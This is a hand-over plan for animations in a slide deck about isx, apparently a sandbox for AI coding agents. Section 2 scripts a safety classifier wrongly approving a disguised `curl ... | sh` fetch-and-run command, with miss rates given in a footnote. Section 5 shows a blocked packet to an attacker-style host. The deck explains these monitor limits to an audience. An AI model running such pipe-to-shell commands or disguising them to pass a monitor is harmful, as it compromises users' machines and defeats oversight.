# isx deck — the animations still to build

This is a hand-over plan. It assumes you have read nothing else; the first
section is everything you need to work in this deck, the rest is one spec per
animation, in the order they pay off. `STORYBOARD.md` has the story and the
claims register; `slides.md` is the deck itself.

## How this deck works

- **Stack:** Slidev 53 (Vue 3 + Vite 8 + UnoCSS). `npm run dev` serves it on
  http://localhost:3030. Text is selectable (`selectable: true` in the headmatter).
- **Animations are native Vue/SVG components stepped by clicks.** That is the
  default and it should stay the default: they export to PDF at every step,
  use the deck's CSS tokens, and need no build step. Motion Canvas exists in
  `animations/` for one clip (`cow`) and is only for something that genuinely
  needs a timeline; don't reach for it.
- **The click contract.** A slide declares `clicks: N` in its frontmatter. A
  component reads the current click with
  `const { $clicks, $renderContext } = useSlideContext()` from `@slidev/client`
  and shows step `k` when `$clicks >= k`. Reveal with a CSS class
  (`.reveal { opacity: 0 } .reveal.on { opacity: 1 }`), never `v-if`, so print
  and the overview render the end state. Real-time playback (a timeline that
  runs on its own after a click) follows `ThirtyMinutes.vue`: a
  `requestAnimationFrame` loop started by a `watch` on `$clicks`, and in any
  render context other than `slide`/`presenter` it jumps to the end state.
  `useIsSlideActive()` stops timers when the slide is off screen.
- **Look.** Tokens live in `style.css` (`--accent` cyan for isx and anything
  affirmative, `--warn` amber for partial/conditional, `--danger` for a real
  threat, never decoratively). Fonts: Inter for words, JetBrains Mono for
  anything a terminal would print. Use existing components as the visual
  vocabulary: agent lanes and the mood meter (`ThirtyMinutes.vue`), machine
  boxes (`Machines.vue`, `IsxBox.vue`), the mock terminal (`Term.vue` +
  `scenes/index.ts`), wires with marching dashes (`ProxyFlow.vue`,
  `PortStory.vue`), the prompt card (`ApproveLoop.vue`).
- **SVG gotchas already hit:** `white-space` does nothing in SVG, use `tspan`
  columns; a CSS `text-anchor` rule overrides the attribute, so use a class;
  a bare class named `b` collides with UnoCSS's border utility.
- **Verify every change:** `node tools/audit.mjs <dir>` screenshots every slide
  with all clicks revealed and flags overflow (content below 700px) and a
  pinned footnote colliding with content. `node tools/shot.mjs <dir> 9:1 19:2`
  screenshots specific slide:click pairs. A full-bleed overlay is exempted
  with `data-overlay`. Look at the screenshots; the audit doesn't judge taste.
- **Honesty is the deck's brand.** Nothing goes on a slide that the isx code
  or docs don't support; roadmap items carry the `roadmap` tag; numbers that
  are estimates say so in the speaker notes. See the claims register in
  `STORYBOARD.md` before drawing anything about caching, Docker, or timings.
- **Placeholders.** Each unbuilt animation is a `<Todo>` block on its slide
  (grep `<Todo` in `slides.md`). Replace the block with the component and set
  the slide's `clicks:`; keep the slide's heading and speaker notes unless
  the spec below says otherwise.
- **Measured vs estimated timings.** `make images` for OpenJDK was measured at
  ~15 minutes with dependencies in place (2026-09-25). Clone, configure, and
  test durations in the scenes and in `ThirtyMinutes.vue` are estimates and
  are consistent with each other (prompts run: 10:00–10:36; isx run:
  10:00–10:24; the gap is the 11½ minutes of waiting). If you change one,
  change all four places: `scenes/index.ts` (`openjdkSandbox`, `openjdkIsx`),
  `ThirtyMinutes.vue`, and the slide titles/notes that quote them.

## 1. Five agents, one of you (Monday, slide "And now run five of them")

**Why it matters.** It is the sequel to the 36-minutes animation and closes the
Monday argument: prompts don't scale with agents, they scale with *you*. It
should feel like slide 19 multiplied, so the audience needs no new legend.

**Component:** `FiveAgents.vue`. **Slide:** `clicks: 2`. Playback: click 1
runs ~25 s in real time; click 2 shows the verdict line.

**Scene.**
- Five horizontal lanes, `agent-1`…`agent-5`, same segment style as
  `ThirtyMinutes.vue` (`a-work` cyan, `a-wait` hatched amber). One time axis
  (0–30 min is fine; it's illustrative, say so in the notes).
- Each lane runs a different short task (a test fix, a dependency bump, a
  migration, a flaky test hunt, a docs build), stopping at prompts at
  different moments. A prompt freezes its lane in `a-wait` until it's answered.
- One **attention cursor**: a small "you" marker (the 🙂 face from the mood
  meter, or a bracket) that can only be in one lane at a time. It moves to a
  waiting lane, dwells ~1.5 s (reading, answering), and moves on. Lanes wait
  their turn: the more lanes are waiting, the longer each waits. Lane 1
  finishes; lanes 4 and 5 are mostly hatched.
- A counter on the right: **waiting: N of 5** and the mood meter from
  `ThirtyMinutes.vue`, degrading with the number of switches, ending on 🤯.
- Verdict line (click 2, `.status.sum` style): *"Five agents. One of you.
  You're the scheduler now, and you're the bottleneck."* (Or shorter; keep
  "you're the bottleneck".)

**Reuse:** copy the lane/segment CSS and the `moods`/`focusLeft` idea from
`ThirtyMinutes.vue` rather than importing; keep each component standalone.

**Acceptance:** audit clean; in print the end state shows all five lanes with
their hatched waits and the fried face; the story is legible at 640px wide
(the overview thumbnail).

## 2. The classifier gate (Monday, slide "Or you turn on auto mode…")

**Why it matters.** Today the slide asserts "usually right"; a gate the room
can watch turns the assertion into a scene. Data (17% miss rate) stays in the
footnote, per the storyboard rule: scenes first, numbers as support.

**Component:** `ClassifierGate.vue`, placed under the statement (the slide
keeps its `layout: center`; the component sits below the lead, the note moves
to the speaker notes or stays as the last line). **Slide:** `clicks: 2`.

**Scene.**
- Left: a queue of commands (mono) sliding toward a gate in the middle
  labelled **a second model**. Right: two lanes out of the gate, *ran* and
  *blocked*.
- Click 1: playback ~15 s. About ten commands: most ordinary ones pass
  correctly (`mvn -q test`, `git commit …`); one legitimate command is
  blocked (`rm -rf target/` → blocked, the agent stalls); and one bad command
  goes through looking harmless (`curl -s https://cdn.example/setup.sh | sh`
  labelled by the agent as "installing the project's formatter"). Colour the
  wrong decisions `--danger` a beat *after* they happen, so the room sees the
  gate be confident first.
- Click 2: the gate gives up: after three blocks in a row, the prompt card
  from `ApproveLoop.vue` pops back up: *"Allow this command?"*, with the
  status line *"…and you're back."* This is the documented behaviour (auto
  mode falls back to prompting after 3 consecutive or 20 total blocks); cite
  it in the notes.

**Honesty notes.** The classifier is a separate model call (Sonnet 5 by
default) that doesn't see tool outputs; say "a second model", not "the same
model", on the slide. Don't imply the misses are frequent: the animation
shows one of each kind in ten, and the footnote carries the real numbers
(0.4% false positives, 17% false negatives on real overeager actions).
Sources: anthropic.com/engineering/claude-code-auto-mode,
code.claude.com/docs/en/permission-modes.

## 3. Set up once (Wednesday, slide "Set up once. Every branch starts ready.")

**Why it matters.** It is the payoff of the copy-on-write clip that precedes
it, and the answer to "won't a fresh machine per task be slow?"

**Component:** `TemplateRace.vue`. **Slide:** `clicks: 3`. Keep the heading;
replace the bullets and the lead with the component (the bullets are the
labels inside it).

**Scene.** Two columns, one clock each.
- Left, **a fresh machine**: click 1 starts a stack filling from the bottom
  as time passes: OS → JDK & tools → `git clone` → `mvn dependency:resolve`
  (a big block, "downloading the internet") → first test. Its clock runs.
- Right, **a template**: the same stack, but labelled *built once*
  (`isx build tpl-java`), already full and dimmed when the slide opens. Click
  2: `isx branch agent-1 --from tpl-java`: a machine pops out beside it in
  seconds (draw it as the `Machines.vue` box) and its clock starts; its first
  block is *the useful command*: the test run.
- Click 3: the right side's test is done while the left is still on
  dependencies. Caption: **time to first useful command**: left *minutes*,
  right *seconds*. Use words, not numbers, until someone measures a real
  template build and branch on the presenter's laptop; put "MEASURE" in the
  speaker notes.

**Reuse:** the CoW block-row look from `public/mc/cow.js` is the visual
ancestor; in Vue, draw the layers as stacked rounded rects.

## 4. Branch a live machine (Wednesday, slide "Branch a live machine")

**Why it matters.** It's the one thing worktrees, Docker and cloud sessions
can't do: fork a *running, prepared* state. The presenter may show it live
(the demo script's Postgres fork); the drawing is the stand-in and the
rehearsal.

**Component:** `LiveBranch.vue`. **Slide:** `clicks: 3`. Keep the two lead
paragraphs above it, or cut the first if space is tight.

**Scene.** A tree, drawn with `Machines.vue` boxes and `.link` curves.
- Root: `tpl-java` (template).
- Click 1: `repro-1`, with a small timeline inside it: *an hour of setup*
  (three SNAPSHOT builds, a patched library, the reported JDK), ending on a
  red *fails reliably* marker. Its services are running (a green dot,
  `postgres` and the app).
- Click 2: `isx branch fix-a --from repro-1` and `isx branch fix-b …`: two
  boxes fork off, each inheriting the whole timeline (dimmed, "inherited")
  and the running services, in seconds. Each gets its own `agent` avatar.
- Click 3: the two branches diverge: `fix-a` goes green, `fix-b` stays red;
  a caption: *the setup was done once; each branch only paid for what it
  changed*. Show the disk delta as the CoW clip did (a few blocks per branch).

**Honesty.** The README documents `isx branch --from <source>` as "source
instance to branch from", so branching from an instance is shipped. What to
confirm before drawing running services carrying over: whether the source
keeps running and whether the branch's services start on boot (a system
container boots its own systemd, so they should). One `isx branch` on a
machine with Postgres running settles it; note the result on the slide.

## 5. Network modes (Friday, slide "Network modes")

**Why it matters.** Low priority: it explains rather than tells a story. Do
it last, and keep it small; the table above it stays.

**Component:** `NetworkModes.vue`. **Slide:** `clicks: 3`.

**Scene.** Three panels side by side, the same machine and the same three
packets in each: one to `api.anthropic.com` (via the proxy), one to
`github.com`, one to `evil.example`. Panel 1 *full internet*: all three
leave (the API one through the proxy box). Panel 2 `--proxy-only`: only the
proxy packet leaves; the other two hit a wall (`--danger` ✗) with the
caption *iptables: drop everything but the proxy and DNS*. Panel 3
`--airgap`: the machine has no network device at all: draw no wire. Clicks
light the panels one at a time.

## 6. Caching without surprises (Under the hood, slide "Caching…")

**Do not build or present until incus-spawn #555 ships.** Today release
artifacts fetched from upstream are cached *without* verification; the slide
describes the post-#555 behaviour. Check the issue first; if it has shipped,
re-read `MitmProxy.java` (`isMavenCacheable`, `fetchCacheAndServe`) and
confirm the checksum step exists before drawing it.

**Component:** `CacheFlow.vue`. **Slide:** `clicks: 4`.

**Scene.** The proxy in the middle, Maven Central on the right, `agent-1` on
the left. Click 1: a `maven-metadata.xml` request goes straight through and
back (label: *always upstream: it can change*). Click 2: a `-SNAPSHOT` jar
does the same. Click 3: a release jar: cache miss → fetch → **checksum
compared with upstream's** → stored → served. Click 4: the same jar again:
cache hit, served locally, with the two measured figures from the slide
(~2.8 ms vs ~177 ms, `docs/PERFORMANCE-NOTES.md`) as the payoff. Say
"checksum", never "signature".

## Smaller polish, if there's time

- **`ProxyFlow.vue` second pass:** show the request as an HTTP message with
  headers and the `x-api-key` line rewriting at the proxy; then a second run
  for `git push` with a GitHub token. Speaker notes on the slide already ask
  for this.
- **`Yardstick.vue` on the dividers:** a tiny three-box progress motif in the
  corner of each act divider, ticked as the acts complete.
- **`HomerFrames.vue` fallback:** if the frames aren't fetched, the Homer
  slide shows the original drawing; `HomerReturn.vue` shows the terminal
  text. Both are fine, but check them once with `public/memes/` moved away.

## Before presenting (not animation work, but in the same hand-over)

- Fetch the Simpsons frames: `tools/fetch-memes.sh` (they're gitignored).
- Measure the rest of the OpenJDK scenario (clone, configure, tests, and how
  many prompts the sandbox really raises) and update the four places listed
  above.
- Re-verify two wordings on "Others are building the same boundary" against
  the current docs: Docker Sandboxes' supported-agent list and Claude Code's
  credential-mask mode.
- The `▶`-less **Demo** slide expects a primed template on the presenter's
  laptop so that `isx branch` is the seconds-long moment the deck promises.
